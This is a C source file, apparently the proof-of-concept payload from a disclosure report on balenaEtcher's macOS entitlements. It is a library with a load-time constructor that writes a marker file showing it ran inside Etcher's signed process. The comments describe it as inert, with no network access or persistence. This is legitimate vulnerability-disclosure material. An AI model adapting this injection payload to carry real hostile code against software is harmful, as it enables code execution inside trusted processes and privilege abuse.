/*
 * Proof-of-concept payload for the balenaEtcher entitlement report.
 *
 * Deliberately inert. It writes one file recording the context it was loaded
 * into, and does nothing else: no network, no persistence, no interaction with
 * the host process's data, no attempt to influence the sudo elevation it is
 * demonstrating the reachability of.
 *
 * The point is only to show that code chosen by an unprivileged local process
 * executes inside balenaEtcher's signed, hardened-runtime, notarised process.
 */
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <time.h>
#include <libproc.h>

__attribute__((constructor))
static void poc_marker(void) {
    const char *out = getenv("POC_MARKER_PATH");
    if (!out) out = "/tmp/etcher-poc-marker.txt";

    char path[PROC_PIDPATHINFO_MAXSIZE] = {0};
    proc_pidpath(getpid(), path, sizeof(path));

    time_t now = time(NULL);
    char when[64];
    strftime(when, sizeof(when), "%Y-%m-%dT%H:%M:%SZ", gmtime(&now));

    FILE *f = fopen(out, "w");
    if (!f) return;
    fprintf(f, "payload executed inside another process\n");
    fprintf(f, "  utc            : %s\n", when);
    fprintf(f, "  host pid       : %d\n", getpid());
    fprintf(f, "  host executable: %s\n", path);
    fprintf(f, "  uid / euid     : %d / %d\n", getuid(), geteuid());
    fclose(f);
}
